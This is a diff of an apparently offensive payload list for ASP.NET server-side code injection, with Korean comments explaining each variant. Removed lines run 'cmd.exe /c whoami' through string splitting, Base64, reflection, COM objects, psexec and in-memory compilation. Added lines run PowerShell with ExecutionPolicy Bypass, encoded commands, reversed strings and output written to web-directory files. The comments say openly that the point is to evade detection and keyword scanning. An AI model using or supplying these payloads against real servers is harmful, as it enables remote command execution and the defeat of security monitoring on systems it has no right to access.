@@ -1,24 +1,16 @@
-<%= new System.Diagnostics.Process { StartInfo = new System.Diagnostics.ProcessStartInfo("c" + "m" + "d" + "." + "e" + "x" + "e", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false } }.Tap(p => p.Start()).StandardOutput.ReadToEnd() %>
-' Process 인스턴스 직접 생성 및 StartInfo 객체 할당 후 실행
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ==")), Arguments = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("L2Mgd2hvYW1p")), RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' FileName 및 Arguments 속성을 전부 Base64로 인코딩하여 감지 우회
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(@"C:\Windows\System32\cmd.exe") { Arguments = string.Format("/{0} {1}", "c", "whoami"), RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 절대 경로 명시 및 string.Format 문자열 동적 조립 실행
-​<%= ((System.Diagnostics.Process)Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetMethod("Start", new Type[] { typeof(string), typeof(string) }).Invoke(null, new object[] { "cmd.exe", "/c whoami > " + Server.MapPath("r.txt") })) == null ? System.IO.File.ReadAllText(Server.MapPath("r.txt")) : "" %>
-' Process.Start(string, string) 메서드를 리플렉션으로 호출 후 파일 출력 결과 수신
-​<%= ((System.IO.StreamReader)Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetProperty("StandardOutput").GetValue(Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetMethod("Start", new Type[] { Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem") }).Invoke(null, new object[] { Activator.CreateInstance(Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem"), "cmd.exe", "/c whoami") }), null)).ReadToEnd() %>
-' ProcessStartInfo 및 Process 객체를 리플렉션으로 완전 동적 인스턴스화하여 결과 출력
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-EncodedCommand d2hvYW1p") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' PowerShell -EncodedCommand(-e) 옵션 활용 (whoami의 UTF-16LE Base64)
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-ExecutionPolicy Bypass -NoProfile -Command "& {whoami}"") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' ExecutionPolicy Bypass 및 NoProfile 옵션을 부여하여 세션 제약 없이 명령 실행
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("conhost.exe", "cmd.exe /c whoami > " + Server.MapPath("c.txt")) { UseShellExecute = false }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("c.txt")) %>
-' Console Host(conhost.exe) 하위로 명령어를 경유하여 파일 리다이렉션 실행
-​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("psexec.exe", "-accepteula -s cmd.exe /c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 서버 내 Sysinternals 도구(psexec 등) 존재 시 이를 활용한 프로세스 창출
-​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("WSc"+"ript.Sh"+"ell"))).Exec("cm"+"d.e"+"xe /c whoami").StdOut.ReadAll() %>
-' WScript.Shell COM 객체를 Late-binding(동적 생성)하여 WScript 스택으로 실행
-​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("Shell.Application"))).ShellExecute("cmd.exe", "/c whoami > " + Server.MapPath("s.txt"), "", "open", 0) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("s.txt")) %>
-' Shell.Application COM 객체의 ShellExecute 메서드로 숨김 창 실행 후 출력 파일 로드
-​<%= (string)Microsoft.CSharp.CSharpCodeProvider.CreateProvider("CSharp").CompileAssemblyFromSource(new System.CodeDom.Compiler.CompilerParameters { GenerateInMemory = true }, "public class X { public static string T() { return System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd(); } }").CompiledAssembly.GetType("X").GetMethod("T").Invoke(null, null) %>
-' CSharpCodeProvider를 이용해 메모리 내에 동적 DLL을 빌드하고 실행
+<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' -NoProfile 및 ExecutionPolicy Bypass 옵션을 부여하여 세션 제약 없이 whoami 실행
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-e dwBoAGEAbQBpAA==") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' whoami 명령어를 UTF-16LE Base64로 인코딩하여 인자(Argument) 키워드 스캔 우회
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("cG93ZXJzaGVsbC5leGU=")), "-e dwBoAGEAbQBpAA==") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' powershell.exe 파일명 및 명령어 전체를 Base64로 숨겨서 실행
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"."+"e"+"x"+"e", "-c " + "&('w'+'h'+'o'+'a'+'m'+'i')") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' PowerShell 문자열과 whoami 명령어를 쪼개서 결합(Concatenation) 후 호출
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c a='imaohw'; &(-joina[5..0])") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' PowerShell 내부에서 문자열을 역순(Reverse) 배치 후 동적 복원하여 실행
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c [System.Security.Principal.WindowsIdentity]::GetCurrent().Name") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
+' whoami.exe 프로세스를 띄우지 않고 PowerShell 내부에서 .NET API로 계정명 직접 추출
+​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c whoami > " + Server.MapPath("p.txt")) { UseShellExecute = false }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("p.txt")) %>
+' C# 표준 출력 파이프를 거치지 않고 웹 디렉터리 임시 파일(p.txt)에 저장 후 System.IO로 확인
+​<%= ((System.IO.StreamReader)Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetProperty("StandardOutput").GetValue(Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetMethod("Start", new Type[] { Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem") }).Invoke(null, new object[] { Activator.CreateInstance(Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem"), "powershell.exe", "-e dwBoAGEAbQBpAA==") }), null)).ReadToEnd() %>
+' Process 및 ProcessStartInfo 타입을 문자열 동적 로드(Reflection)하여 PowerShell 실행
